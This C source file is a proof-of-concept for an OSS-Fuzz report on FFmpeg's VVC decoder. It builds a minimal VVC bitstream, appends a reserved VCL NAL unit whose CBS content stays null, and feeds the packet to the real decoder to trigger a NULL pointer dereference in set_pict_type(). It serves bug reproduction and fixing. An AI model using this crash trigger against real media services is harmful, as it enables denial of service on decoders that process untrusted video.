/*
 * PoC for OSSFUZZ-390565846: NULL pointer dereference in
 * libavcodec/vvc/refs.c:set_pict_type() due to a CBS unit whose
 * content_ref was never populated (a reserved VCL NAL unit type,
 * VVC_RSV_VCL_4, causes ff_cbs_alloc_unit_content()/read_unit() to
 * fail with AVERROR(ENOSYS), which cbs_read_fragment_content()
 * tolerates, leaving unit->content_ref == NULL while still
 * appearing in the fragment's unit list).
 *
 * This program builds a tiny, syntactically valid VVC Annex-B
 * bitstream in memory using the CBS writer (SPS + PPS + a single
 * non-IRAP TRAIL slice with an embedded picture header that has
 * ph_inter_slice_allowed_flag = 1), appends one raw NAL unit with
 * a reserved VCL type (RSV_VCL_4) whose content the CBS layer
 * cannot decompose, and feeds the whole thing as ONE AVPacket
 * directly to the real VVC decoder (mirroring how the OSS-Fuzz
 * ffmpeg_AV_CODEC_ID_VVC_fuzzer target drives the decoder).
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "libavcodec/avcodec.h"
#include "libavcodec/packet.h"
#include "libavcodec/cbs.h"
#include "libavcodec/cbs_h266.h"
#include "libavcodec/vvc.h"
#include "libavutil/buffer.h"
#include "libavutil/refstruct.h"
#include "libavutil/mem.h"

static void die(const char *msg, int err)
{
    fprintf(stderr, "FAIL: %s (%d)\n", msg, err);
    _exit(1);
}

int main(void)
{
    CodedBitstreamContext *wctx = NULL;
    CodedBitstreamFragment frag;
    AVPacket *pkt = NULL;
    int ret;

    memset(&frag, 0, sizeof(frag));

    ret = ff_cbs_init(&wctx, AV_CODEC_ID_VVC, NULL);
    if (ret < 0)
        die("ff_cbs_init", ret);

    /* ---------------- SPS ---------------- */
    H266RawSPS *sps = av_refstruct_allocz(sizeof(*sps));
    if (!sps)
        die("alloc sps", -1);

    sps->nal_unit_header.nal_unit_type        = VVC_SPS_NUT;
    sps->nal_unit_header.nuh_temporal_id_plus1 = 1;

    sps->sps_seq_parameter_set_id   = 0;
    sps->sps_video_parameter_set_id = 0;
    sps->sps_max_sublayers_minus1   = 0;
    sps->sps_chroma_format_idc      = 0; /* monochrome: skips a lot of syntax */
    sps->sps_log2_ctu_size_minus5   = 0; /* CTU size 32 */

    sps->sps_pic_width_max_in_luma_samples  = 32;
    sps->sps_pic_height_max_in_luma_samples = 32;

    sps->sps_log2_max_pic_order_cnt_lsb_minus4 = 4;

    sps->sps_rpl1_same_as_rpl0_flag = 1;
    sps->sps_num_ref_pic_lists[0]   = 0;
    sps->sps_num_ref_pic_lists[1]   = 0;

    /* sps_subpic_info_present_flag == 0 path: the writer still
     * validates several "inferred" values against our struct. */
    sps->sps_independent_subpics_flag = 1;
    sps->sps_subpic_width_minus1[0]   = 0; /* ceil(32/32)-1 */
    sps->sps_subpic_height_minus1[0]  = 0;

    /* Required because chroma_format_idc == 0 forces these to be
     * inferred as 1 on the write side; the struct must already
     * hold that value or the CBS writer's consistency check fails. */
    sps->sps_chroma_horizontal_collocated_flag = 1;
    sps->sps_chroma_vertical_collocated_flag   = 1;

    /* vui_parameters_default() infers these non-zero values. */
    sps->vui.vui_colour_primaries               = 2;
    sps->vui.vui_transfer_characteristics        = 2;
    sps->vui.vui_matrix_coeffs                   = 2;
    sps->vui.vui_chroma_sample_loc_type_frame    = 6;
    sps->vui.vui_chroma_sample_loc_type_top_field    = 6;
    sps->vui.vui_chroma_sample_loc_type_bottom_field = 6;

    ret = ff_cbs_insert_unit_content(&frag, -1, VVC_SPS_NUT, sps, sps);
    if (ret < 0)
        die("insert sps", ret);

    /* ---------------- PPS ---------------- */
    H266RawPPS *pps = av_refstruct_allocz(sizeof(*pps));
    if (!pps)
        die("alloc pps", -1);

    pps->nal_unit_header.nal_unit_type        = VVC_PPS_NUT;
    pps->nal_unit_header.nuh_temporal_id_plus1 = 1;

    pps->pps_pic_parameter_set_id = 0;
    pps->pps_seq_parameter_set_id = 0;

    pps->pps_pic_width_in_luma_samples  = 32;
    pps->pps_pic_height_in_luma_samples = 32;

    pps->pps_no_pic_partition_flag = 1; /* single tile, single slice */

    ret = ff_cbs_insert_unit_content(&frag, -1, VVC_PPS_NUT, pps, pps);
    if (ret < 0)
        die("insert pps", ret);

    /* ---------------- Slice (TRAIL, non-IRAP, inter-allowed PH) ---------------- */
    H266RawSlice *slice = av_refstruct_allocz(sizeof(*slice));
    if (!slice)
        die("alloc slice", -1);

    slice->header.nal_unit_header.nal_unit_type         = VVC_TRAIL_NUT;
    slice->header.nal_unit_header.nuh_temporal_id_plus1  = 1;

    slice->header.sh_picture_header_in_slice_header_flag = 1;

    H266RawPictureHeader *ph = &slice->header.sh_picture_header;
    ph->ph_gdr_or_irap_pic_flag   = 0;
    ph->ph_non_ref_pic_flag       = 0;
    ph->ph_inter_slice_allowed_flag = 1; /* required for the bug */
    ph->ph_intra_slice_allowed_flag = 0;
    ph->ph_pic_parameter_set_id   = 0;
    ph->ph_pic_order_cnt_lsb      = 0;

    /* Required non-zero inferred defaults given our chosen flags. */
    ph->ph_pic_output_flag     = 1;
    ph->ph_bdof_disabled_flag  = 1;
    ph->ph_dmvr_disabled_flag  = 1;
    ph->ph_prof_disabled_flag  = 1;
    ph->ph_mvd_l1_zero_flag    = 0;

    slice->header.sh_slice_type = VVC_SLICE_TYPE_P;
    slice->header.sh_num_ref_idx_active_override_flag = 1;
    /* sh_ref_pic_lists.rpl_ref_list[*].num_ref_entries left at 0:
     * an explicit, empty reference picture list -- syntactically
     * legal and never actually used because the crash happens
     * while building the frame, before any CTU/reference-list use. */

    /* Minimal placeholder slice payload so cbs_h2645_read_more_rbsp_data()
     * sees more data after the header (required by the VVC slice
     * reader) even though we never reach real CABAC decoding. */
    AVBufferRef *sdata = av_buffer_alloc(4);
    if (!sdata)
        die("alloc slice data", -1);
    memset(sdata->data, 0xAA, 4);
    slice->data          = sdata->data;
    slice->data_ref      = sdata;
    slice->data_size     = 4;
    slice->data_bit_start = 0;

    ret = ff_cbs_insert_unit_content(&frag, -1, VVC_TRAIL_NUT, slice, slice);
    if (ret < 0)
        die("insert slice", ret);

    /* ---------------- Reserved VCL NAL (the actual trigger) ---------------- */
    /* nuh_layer_id=0, nal_unit_type=VVC_RSV_VCL_4(4), temporal_id_plus1=1 */
    uint8_t *rsv = av_malloc(2);
    if (!rsv)
        die("alloc rsv", -1);
    rsv[0] = 0x00;
    rsv[1] = (VVC_RSV_VCL_4 << 3) | 1;

    ret = ff_cbs_append_unit_data(&frag, VVC_RSV_VCL_4, rsv, 2, NULL);
    if (ret < 0)
        die("append rsv unit", ret);

    /* ---------------- Assemble into one AVPacket ---------------- */
    pkt = av_packet_alloc();
    if (!pkt)
        die("packet alloc", -1);

    ret = ff_cbs_write_packet(wctx, pkt, &frag);
    if (ret < 0)
        die("ff_cbs_write_packet", ret);

    fprintf(stderr, "Built %d-byte VVC packet\n", pkt->size);
    {
        FILE *df = fopen("/tmp/poc_dump.bin", "wb");
        if (df) {
            fwrite(pkt->data, 1, pkt->size, df);
            fclose(df);
        }
    }

    /* ---------------- Feed it to the real VVC decoder ---------------- */
    const AVCodec *dec = avcodec_find_decoder(AV_CODEC_ID_VVC);
    if (!dec)
        die("find_decoder", -1);

    AVCodecContext *avctx = avcodec_alloc_context3(dec);
    if (!avctx)
        die("alloc_context3", -1);

    ret = avcodec_open2(avctx, dec, NULL);
    if (ret < 0)
        die("avcodec_open2", ret);

    AVFrame *frame = av_frame_alloc();
    if (!frame)
        die("frame alloc", -1);

    ret = avcodec_send_packet(avctx, pkt);
    fprintf(stderr, "send_packet -> %d\n", ret);
    if (ret >= 0) {
        do {
            ret = avcodec_receive_frame(avctx, frame);
            fprintf(stderr, "receive_frame -> %d\n", ret);
        } while (ret != AVERROR(EAGAIN) && ret != AVERROR_EOF);
    }

    fprintf(stderr, "DONE (no crash)\n");
    _exit(0);
}
